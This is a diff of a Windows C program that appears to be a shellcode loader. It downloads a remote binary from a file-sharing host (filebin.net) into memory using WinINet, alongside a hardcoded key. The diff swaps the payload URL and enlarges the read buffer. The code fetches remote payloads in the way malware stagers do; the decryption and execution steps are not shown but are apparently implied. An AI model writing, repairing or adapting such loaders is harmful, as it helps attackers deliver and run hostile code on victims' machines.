@@ -10,7 +10,7 @@ unsigned char key[] = "mysecretkey12345";
 int main() {
     DWORD dwBytesRead = 0;
     HANDLE hProcess = NULL;
-    LPCWSTR sourceURL = L"https://filebin.net/9tvhx1mfxu87m5tx/calc.bin";
+    LPCWSTR sourceURL = L"https://filebin.net/1mtq88xt195tuvho/calc";
     PBYTE pBytes = NULL, pTmpBytes = NULL;
     SIZE_T sSize = 0;
     HINTERNET hInet = NULL, hURL = NULL;
@@ -45,7 +45,7 @@ int main() {
         goto cleanup;
     }
 
-    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
+    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 10240);
     if (pTmpBytes == NULL) {
         LOG_ERROR("Failed to allocate memory for temp buffer");
         goto cleanup;
@@ -54,7 +54,7 @@ int main() {
     LOG_SUCCESS("Successfully allocated memory to temp buffer!\n\\---0x%p", pTmpBytes);
 
     while (TRUE) {
-        if (!InternetReadFile(hURL, pTmpBytes, 1024, &dwBytesRead)) {
+        if (!InternetReadFile(hURL, pTmpBytes, 10240, &dwBytesRead)) {
             LOG_ERROR("Could not read contents of specified file... Error: %ld", GetLastError());
             goto cleanup;
         }
@@ -74,7 +74,7 @@ int main() {
 
         memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
 
-        if (dwBytesRead < 1024) {
+        if (dwBytesRead < 10240) {
             break;
         }
     }
